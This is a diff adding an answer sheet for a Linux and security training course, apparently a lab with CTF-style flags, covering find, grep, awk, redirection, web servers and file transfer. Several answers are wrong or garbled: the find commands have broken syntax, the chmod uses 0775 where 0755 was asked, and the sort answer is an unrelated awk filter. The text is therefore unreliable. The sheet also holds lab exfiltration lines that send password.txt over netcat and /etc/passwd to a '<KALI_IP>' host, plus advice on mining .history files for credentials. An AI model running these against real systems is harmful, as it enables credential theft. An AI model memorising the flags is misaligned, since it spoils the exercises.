@@ -1,1 +1,78 @@
+ANSWERS LINUXDOCUMENTATION GITHUB KAMKAR
 
+
+CHAPTER 2
+Create a file named my-file.txt with the touch command. Then execute the locate my-file.txt command. Do you find the file? 
+Touch my-file.txt – found the file 
+Run the command sudo updatedb. And run the locate my-file.txt command again. Do you find your file ? 
+Updatedb – found the file
+With the command which, find the executable file nc and indicate the path 
+Path : /bin/nc
+ With the command which, find the executable file becode. What is the flag ? 
+FLAG : BC{WH1CH_FLAG_EXECUTABLE¸FILE}
+Search with find command for a file that contains the name "Edgar Allan Poe". What is the flag ?
+FLAG : BC{3d54r_4ll4n_P03_FL45}
+ Using the find command, find the file password.txt and specify the flag. 
+FLAG : BC{PASSWORD_FILE}
+With the command find, find a file that starts with becode- and ends with .sh. 
+FLAG : BC{YOU_CAN_FIND_ME_WITH_WHICH_IF_AM_EXEC}
+Using the find command to identify any file (not directory) modified in the last day, NOT owned by the root user and execute ls -l on them. Chaining/piping commands is NOT allowed!
+find	/-type f	  -mtime0! -user root – exec ls -l -{} \ ;
+With the find command, find all the files that have an authorization of 0777. 
+find /-type f – perm 0777 exec – ls – l {} \ ;
+With the find command, find all the files in the folder /home/student/findme/ that have an authorization of 0777 and change the rights of these files to 0755.
+find home/student/findme/-type f -perm 0777 – exec chmod 0775 {} \ ;
+
+
+------------------------------------------------------------------------------------------------------------------------
+CHAPTER3
+Search all sequences containing "Loxondota" in /home/student/lorem.txt
+BC{GREP_ME_LOREM_FL4G}
+Copy the file /etc/passwd to your home directory. Display the line starting with student name. 
+cp /etc/passwd ~/passwd_copy
+grep "^student" ~/passwd_copy
+Display the lines in the passwd file starting with login names of 3 or 4 characters ; Response : grep -E "^.{3,4}:" /etc/passwd
+In the file /home/student/sample.txt how many different values are there in the first column? in the second? Response : 8 columns /  command; awk '{count[$1]++} END {print "Number of different values in the first column:", length(count)}' /home/student/sample.txt
+Response : 1 column / command ; awk '{count[$2]++} END {print "Number of different values in the second column:", length(count)}' /home/student/sample.txt
+In the file /home/student/sample.txt sort the values in the second column by frequency of occurrence. (uniq -c can be useful) command ; cut -f2 /home/student/sample.txt | sort | uniq -c | sort -rn /response : 1 ind4,20 1 ind4,11 1 ind3,20  1 ind3,10 1 ind2,30  1 ind2,20 1 ind1,20  1 ind1,10
+In the file /home/student/iris.data Change the column separator (comma) to tab (make sure that the changes are applied to the file) command : sed -i 's/,/\t/g' /home/student/iris.data 
+In the file /home/student/iris.data, extract from this file the column 3 (petal length in cm) (use cut ) command :cut -f3 /home/student/iris.data
+In the file /home/student/iris.data, count the number of flower species (cut and uniq) command :cut -f5 /home/student/iris.data | sort | uniq | wc -l
+In the file /home/student/iris.data, sort by increasing petal length (see sort options) command : awk -F'\t' 'NR==FNR{sum+=$3; count++} NR!=FNR && $3 > sum/count {print}' /home/student/iris.data /home/student/iris.data
+Using /etc/passwd, extract the user and home directory fields for all users on your student machine for which the shell is set to /bin/false. command :awk -F':' '$7=="/bin/false" {print $1, $6}' /etc/passwd
+---------------------------------------------------------------------------------------------------------------------------
+CHAPTER4
+Write the message "hello everyone" in a file called "test" by redirecting the output of the echo command. Respons ; echo "hello everyone" > test / if you want to append the texte to an existing file without overwriting it use : echo "hello everyone" >> test
+Write the message "goodbye" in the same file "test" by redirecting the output of the echo command and without overwriting the content of "test" and check with the cat command. Response ; echo "goodbye" >> test. To check the content of the test file use cat test.
+Make the ls -la command redirect to the foo file. Response : ls -la > foo
+Execute find /etc -name *conf* command and redirect errors (only errors) to a file named err.txt. Response ; find /etc -name *conf* 2> err.txt
+Repeat the previous exercise, this time redirecting the errors to the linux nothingness. Response :find /etc -name *conf* 2> /dev/null
+Now redirect the standard output and the error output of the find /etc -name *conf* command to two different files (std.out and std.err). Response : find /etc -name *conf* > std.out 2> std.err
+Create a pipe named "MyNammedPipe". Then execute the pwd command which will transmit the data in this pipe. Then use the cat command to read the contents of your "MyNammedPipe" pipe. Respose : mkfifo MyNamedPipe / pwd > MyNamedPipe / cat < MyNamedPipe
+With cat command, add number the lines in the file /etc/passwd with the command nl. Response :cat /etc/passwd | nl
+Using the previous nl command, the head and tail commands, display the lines of /etc/passwd between line 7 and line 12. Response : nl /etc/passwd | head -n 12 | tail -n +7
+---------------------------------------------------------------------------------------------------------------------------
+CHAPTER5
+On your student machine what is the value of the FLAG environment variable ?Running the command echo $FLAG does not display any output and simply moves to the next line without showing a value, it indicates that the FLAG environment variable is not set on your system.
+Currently if you notice your machine, the variable you have created will be deleted. What should you do to make your variable persistent? (With a Bash shell). Response: add the variable definition to one of the startup files, such as ~/.bashrc or ~/.bash_profile
+From a hacker's perspective, look for information that might be useful to you in the .history file. Response :  - gain insights into the user's workflow, preferences, or commonly used tools. - Sensitive information, such as passwords, API keys, or other confidential data, in their command history. By reviewing the .history file, an hacker may discover such information and exploit it for unauthorized access. - system-level commands executed by the user, providing insights into the configuration of the system. This information can help an hacker understand the system's environment, installed software, and potential vulnerabilities. - Commands involving network-related operations, such as SSH connections, file transfers, or database interactions, might be present in the history file. This information can give an HAcker an idea of external connections made by the user and potentially provide entry points for further exploitation.
+From an analyst's perspective, look for information that might be useful to you in the .history file. Response : - Troubleshooting and debugging - Configuration changes -Workflow analysisSecurity auditing - User activity monitoring
+----------------------------------------------------------------------------------------------------------------------------
+CHAPTER6 NO EXERCISES
+
+----------------------------------------------------------------------------------------------------------------------------
+CHAPTER7
+What other well-known service could be used instead of nginx? Response : APACHE HTTP SERVER, MICROSOFT INTERNET INFORMATION SERVICE, CADDY, LITESPEED, AZURE, HAPROXY
+On your student machine, create a temporary http server with python, on port 5000. Then on your kali machine, open a browser and go to the address 10.12.181.X: Response : python -m http.server 5000
+Let's imagine that a hacker owns the domain name g00gle.com, which tool would allow him to obtain an ssl certificate (https) very easily? Let’s Encrypt
+On a linux machine, what tool could you use to have a self-signed SSL certificate on your local machine (localhost) ? Response : Open SSL tool
+What is the default port for ftp? Response : FTP uses a client-server architecture, where the FTP client communicates with the FTP server using two channels: the control channel (port 21) and the data channel (port 20 by default for active mode, or dynamically assigned in passive mode). While port 21 is the default port for FTP control, it's important to note that FTP can also be configured to use different ports, especially when running in passive mode or behind firewalls/NAT routers. In passive mode, the data channel can use a range of dynamically assigned ports.When connecting to an FTP server, if the client does not specify a port explicitly, it assumes port 21 as the default port for the FTP control connection.
+Is the ftp protocol secured? Response : No, the FTP (File Transfer Protocol) protocol is not inherently secure. However, there are secure alternatives to traditional FTP that address these security concerns: FTPS (FTP Secure), STFP (SSH file transfer protocol)
+What is the default port for telnet? The default port for Telnet is port 23. Telnet is a network protocol used for remote login and interactive communication with a remote system. Port 23 is the standard port used for establishing Telnet connections to remote servers.
+Is Telnet protocol secure ? Response : However, it's worth mentioning that Telnet is an insecure protocol that transmits data, including usernames and passwords, in plaintext. Due to its lack of encryption, Telnet is considered highly vulnerable to eavesdropping and unauthorized access. In modern environments, it is recommended to use more secure alternatives such as SSH (Secure Shell) for remote login and interactive sessions. SSH provides encryption and secure authentication, making it a more secure choice compared to Telnet.
+------------------------------------------------------------------------------------------------------------------------------
+CHAPTER8
+On your Student machine, download the malware.txt file with the wget command. Response : wget https://example.com/malware.txt -O malware.txt
+On your Student machine, download the malware.txt file with the cURL command. Response :curl -O https://example.com/malware.txt
+On the student machine, create a file named password.txt and transfer it to your student machine with netcat? Response : nc -l -p 5000 > received_password.txt / nc <10.12.1.11> 5000 < password.txt
+On the student machine, transfer /etc/passwd file to your kali machine with tf. Response : tf / tf -s <KALI_IP>:<TRANSFER_TOKEN> /etc/passwd /
